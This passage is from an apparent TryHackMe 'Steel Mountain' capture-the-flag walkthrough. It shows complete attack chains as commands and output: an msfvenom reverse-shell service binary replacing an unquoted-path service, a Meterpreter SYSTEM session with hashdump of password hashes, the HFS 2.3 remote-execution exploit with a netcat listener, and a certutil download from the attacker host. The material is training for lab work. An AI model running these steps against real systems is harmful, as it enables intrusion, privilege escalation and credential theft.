SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
meterpreter &gt; ls
Listing: C:\Users\Bill\Desktop
Mode              Size    Type  Last modified              Name
100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  600580  fil   2023-02-20 05:04:40 -0500  powerup.ps1
100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt

meterpreter &gt; cat user.txt
b0476***************************</code></pre><blockquote id="9f37fad4-990d-4400-b5a7-d5fa98272eea" class=""><mark class="highlight-yellow">Question: Use Metasploit to get an initial shell. What is the user flag?</mark>
<mark class="highlight-teal">Answer: The content of user.txt</mark></blockquote><p id="06798f99-f335-43ac-bd38-c1b6ddf85ffc" class="">
</p><p id="e9e6b920-e91e-4569-9723-2eeb470d086a" class="">We have received an initial foothold but we have the access via a low privileged user. We will now escalate our privileges.</p><h2 id="f62c952d-1230-4ae5-8cd8-679b098db516" class=""><mark class="highlight-blue">Privilege Escalation</mark></h2><p id="bcf4207c-db9e-40b0-9453-549841df2b2c" class="">
</p><p id="10d584c0-cd5c-43b3-97d3-d98103cc89d9" class="">We will download powerup.ps1 and upload it to the machine.</p><p id="c4df6e08-b54a-496c-8666-8d74d25e5903" class="">
</p><pre id="935a66c7-424d-43fd-9828-f038dbec441d" class="code"><code>meterpreter &gt; upload /root/privesc/powerup.ps1
[] uploading  : /root/privesc/powerup.ps1 -&gt; powerup.ps1
[] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/privesc/powerup.ps1 -&gt; powerup.ps1
[*] uploaded   : /root/privesc/powerup.ps1 -&gt; powerup.ps1
meterpreter &gt; load powershell
Loading extension powershell...Success.
meterpreter &gt; powershell_shell
PS &gt; .\powerup.ps1
PS &gt; Invoke-AllChecks
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;AdvancedSystemCareService9&#x27; -Path &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;AdvancedSystemCareService9&#x27; -Path &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;AdvancedSystemCareService9&#x27; -Path &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;AdvancedSystemCareService9&#x27; -Path &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;AWSLiteAgent&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;AWSLiteAgent&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;IObitUnSvr&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;IObitUnSvr&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;IObitUnSvr&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;IObitUnSvr&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;LiveUpdateSvc&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;LiveUpdateSvc&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name &#x27;LiveUpdateSvc&#x27; -Path &lt;HijackPath&gt;
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name &#x27;AdvancedSystemCareService9&#x27;
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name &#x27;IObitUnSvr&#x27;
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name &#x27;LiveUpdateSvc&#x27;
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files</code></pre><p id="22b41589-fba4-4039-bd7b-5597405a29fa" class="">
</p><p id="70acb360-bd6b-4575-a2ae-98276d1dc281" class="">Now we will use msfvenom to create the payload. We will use port 4443.</p><p id="ac4cf440-6741-4cc1-9f1f-448975f7175d" class="">
</p><pre id="3ae98361-a9e6-4faf-88fb-6eff7835586b" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.23.54 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe-service file: 15872 bytes
Saved as: ASCService.exe</code></pre><p id="73aa4423-1c3f-4ef5-a10e-33b05ff17659" class="">
</p><p id="e6f57a36-9caa-4440-aa98-325b9a679e71" class="">We will upload the exe now and replace it with the malicious exe which we have generated.</p><p id="1932e010-24de-4284-a9cb-950b7abcc262" class="">
</p><pre id="726b4426-9953-492a-8142-849020245eb4" class="code"><code>meterpreter &gt; upload ASCService.exe
[*] uploading  : /root/steelmountain/ASCService.exe -&gt; ASCService.exe
[-] core_channel_open: Operation failed: The process cannot access the file because it is being used by another process.
meterpreter &gt; shell
Process 892 created.
Channel 12 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9
SERVICE_NAME: AdvancedSystemCareService9
TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
STATE              : 4  RUNNING
(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
WIN32_EXIT_CODE    : 0  (0x0)
SERVICE_EXIT_CODE  : 0  (0x0)
CHECKPOINT         : 0x0
WAIT_HINT          : 0x0
C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc query AdvancedSystemCareService9
sc query AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit\Advanced SystemCare&gt;^C
Terminate channel 12? [y/N]  y
meterpreter &gt; upload ASCService.exe
[*] uploading  : /root/steelmountain/ASCService.exe -&gt; ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/steelmountain/ASCService.exe -&gt; ASCService.exe
[*] uploaded   : /root/steelmountain/ASCService.exe -&gt; ASCService.exe</code></pre><p id="28754ffb-b0c6-4de6-9b02-fb961feb5337" class="">
</p><blockquote id="d385b948-463d-49b2-9348-80b77efb754c" class=""><mark class="highlight-yellow">Question: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an </mark><mark class="highlight-yellow"><em>unquoted service path</em></mark><mark class="highlight-yellow"> vulnerability?</mark>
<mark class="highlight-teal">Answer: AdvancedSystemCareService9</mark></blockquote><p id="6a72fe63-1462-4720-b773-b4af1d7b69af" class="">
</p><p id="75fdcb02-d5fa-408c-b8ae-da9d71c3910f" class="">Now we will configure another listener on port 4443.</p><p id="6370f3c6-e2e5-4075-bd49-092ab3de5676" class="">
</p><pre id="159c74bd-9caf-4930-8a51-f14daf58a46a" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# msfconsole
Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
Stack: 90909090990909090990909090
90909090990909090990909090
90909090.90909090.90909090
90909090.90909090.90909090
90909090.90909090.09090900
90909090.90909090.09090900
..........................
cccccccccccccccccccccccccc
cccccccccccccccccccccccccc
ccccccccc.................
cccccccccccccccccccccccccc
cccccccccccccccccccccccccc
.................ccccccccc
cccccccccccccccccccccccccc
cccccccccccccccccccccccccc
..........................
ffffffffffffffffffffffffff
ffffffff..................
ffffffffffffffffffffffffff
ffffffff..................
ffffffff..................
ffffffff..................
Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing
   =[ metasploit v6.0.45-dev                          ]
- --=[ 2134 exploits - 1139 auxiliary - 364 post ]
- --=[ 592 payloads - 45 encoders - 10 nops ]
- --=[ 8 evasion ]
Metasploit tip: After running db_nmap, be sure to
check out the result of hosts and services
msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 10.2.23.54
LHOST =&gt; 10.2.23.54
msf6 exploit(multi/handler) &gt; set LPORT 4443
LPORT =&gt; 4443
msf6 exploit(multi/handler) &gt; exploit
[*] Started reverse TCP handler on 10.2.23.54:4443</code></pre><p id="6eadcd5f-78bf-43e9-aa47-cce1899ee567" class="">
Now we will start the service and we will receive another reverse shell.</p><p id="22872908-270b-4e0d-aa9a-f57017a3705b" class="">
</p><pre id="5046b66d-94e7-4cf5-9fa9-3d81ee96bff4" class="code"><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
SERVICE_NAME: AdvancedSystemCareService9
TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
STATE              : 2  START_PENDING
(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
WIN32_EXIT_CODE    : 0  (0x0)
SERVICE_EXIT_CODE  : 0  (0x0)
CHECKPOINT         : 0x0
WAIT_HINT          : 0x7d0
PID                : 1844
FLAGS              :</code></pre><p id="636dc43c-81a2-43cb-9d7d-03650738cce7" class="">

Reverse Shell:</p><pre id="17e5d150-3cda-41ff-aa3f-79ebb4d82344" class="code"><code>[] Sending stage (175174 bytes) to 10.10.48.6
[] Meterpreter session 1 opened (10.2.23.54:4443 -&gt; 10.10.48.6:49404) at 2023-02-20 05:43:54 -0500
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter &gt; pgrep lsass.exe
652
meterpreter &gt; migrate 652
[] Migrating from 2956 to 652...
[] Migration completed successfully.
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:53dbf27b0f37b1ef784c8a4768c0e9fa:::
bill:1001:aad3b435b51404eeaad3b435b51404ee:a3c2a771303f6e954077bcc663e89213:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter &gt; cd C:\\Users\\Administrator\\Desktop
meterpreter &gt; ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1528  fil   2020-10-12 15:05:50 -0400  activation.ps1
100666/rw-rw-rw-  282   fil   2019-09-26 10:11:25 -0400  desktop.ini
100666/rw-rw-rw-  32    fil   2019-09-27 08:40:56 -0400  root.txt

meterpreter &gt; cat root.txt</code></pre><blockquote id="0eb77cdb-8484-46c0-ace0-1f5252c170c3" class="block-color-gray_background"><mark class="highlight-yellow">Question: What is the root flag?</mark>
<mark class="highlight-teal">Answer: Content of root.txt</mark></blockquote><h2 id="ef61e6d5-d96c-4289-a75a-60cdb818cdb4" class="">
<mark class="highlight-blue">Initial foothold without metasploit</mark></h2><p id="01f95db4-dc1a-4e03-8d3e-11a3c29d3cc6" class="">
</p><figure id="759f1a0a-08cc-4a97-a415-126c560e999f" class="image"><a href="Steel%20Mountain%201aaf0322439c481fac5edd3ba2c32f77/Untitled%203.png"><img style="width:1874px" src="../../images/tryhackme/steelmountain/Untitled%203.png"/></a></figure><p id="87ed26e8-5369-4a10-93e3-dedc919551bc" class="">
</p><pre id="22b0318f-95fa-4bb2-9eab-2da9dec97edd" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# searchsploit -m 39161
Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
URL: https://www.exploit-db.com/exploits/39161
Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminatorsCopied to: /root/steelmountain/39161.py</code></pre><p id="da8bf7fa-166a-4eb6-b3b6-244c45f5ac47" class="">
</p><figure id="ea5cb50b-d026-4d62-a646-282721e246fc" class="image"><a href="Steel%20Mountain%201aaf0322439c481fac5edd3ba2c32f77/Untitled%204.png"><img style="width:1729px" src="../../images/tryhackme/steelmountain/Untitled%204.png"/></a></figure><p id="2219af64-b2d1-45e8-a172-1936cfcb2e24" class="">
</p><p id="dca3b687-53fa-47e0-9815-a8b6cc69aadc" class="">We need to host a webserver with netcat in it.</p><p id="91b22929-62f5-4bf3-a08d-d3c8c6e01fe5" class="">
</p><pre id="ddf43a0f-7ea1-40b0-9859-952e3ddeb6c9" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# cp /usr/share/windows-resources/binaries/nc.exe nc.exe
â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre><p id="0d2ea309-dc1e-4604-adbe-d85c0866b58d" class="">
We will change the IP address and the port in the python file as follows. This will confugure our LHOST and LPORT. We will use port 5555.
</p><figure id="db629b23-eb3f-4fc5-80cf-40dd24765e65" class="image"><a href="Steel%20Mountain%201aaf0322439c481fac5edd3ba2c32f77/Untitled%205.png"><img style="width:1881px" src="../../images/tryhackme/steelmountain/Untitled%205.png"/></a></figure><p id="4d167c2f-8066-4e38-95bf-c097dfaea503" class="">
Now we will configure a listener using netcat.</p><p id="24c01b2d-44d8-4986-ab45-b797497eab4f" class="">
</p><pre id="42d24739-9882-4604-9391-350a00f0eab2" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# nc -nvlp 5555
listening on [any] 5555 ...</code></pre><p id="125004ea-1987-4c44-b8ff-55029292c6db" class="">
</p><p id="1f0d0014-e428-4ed2-9a0d-6a005079661c" class="">We will execute the python script as suggested in the exploit. As mentioned in the exploit script, we may need to execute the script multiple times.</p><p id="1414c530-1a7b-44ee-a332-fc21da725565" class="">
</p><pre id="7cc8e1fb-62a1-4d90-bf6d-18595e6d1bc0" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# python 39161.py 10.10.48.6 8080
â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# python 39161.py 10.10.48.6 8080</code></pre><p id="c14a8a4a-fd54-4526-a201-44ca92d31d54" class="">
Shell from the machine:</p><pre id="18bcf71b-b507-4da4-ae97-6567517b3205" class="code"><code>connect to [10.2.23.54] from (UNKNOWN) [10.10.48.6] 49453
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;whoami
whoami
steelmountain\bill</code></pre><p id="2f968297-52ef-4740-a867-d199e66b8821" class="">

For privilege escalation we can use powerup.ps1. We will copy the powerup.ps1 file to the folder where we have hosted the webserver. </p><p id="7e762b96-4691-4aa6-97f5-320116be71cf" class="">
</p><pre id="9d987fd1-13db-4685-8092-f39548649008" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# cp /root/privesc/powerup.ps1 /root/steelmountain
â”Œâ”€â”€(rootðŸ’€kali)-[~/steelmountain]
â””â”€# ls
39161.py  ASCService.exe  nc.exe  powerup.ps1</code></pre><p id="d25b514e-15ee-4370-9b9e-b6ea50c0f0ea" class="">
We will download the powerup.ps1 on the machine using cerutil.
</p><pre id="9417e434-b83d-47dd-94d1-932999326569" class="code"><code>C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;certutil.exe -urlcache -f http://10.2.23.54/powerup.ps1 powerup.ps1
certutil.exe -urlcache -f http://10.2.23.54/powerup.ps1 powerup.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;dir
dir
Volume in drive C has no label.
Volume Serial Number is 2E4A-906A
Directory of C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
02/20/2023  04:42 AM    &lt;DIR&gt;          .
02/20/2023  04:42 AM    &lt;DIR&gt;          ..
02/20/2023  02:17 AM    &lt;DIR&gt;          %TEMP%
02/16/2014  12:58 PM           760,320 hfs.exe
02/20/2023  04:42 AM           600,580 powerup.ps1
2 File(s)      1,360,900 bytes
3 Dir(s)  44,151,607,296 bytes free</code></pre><p id="57430f57-c695-4344-9ad4-e55af33d007a" class="">
Now we can run the script and repeat the procedure we have done previously.</p><p id="d0427b96-7d06-4e16-a852-fb97b23b7c6d" class="">
</p><p id="03e9db54-af53-4ff6-b3a7-8828239fdd5a" class="">
</p></div></article></body></html>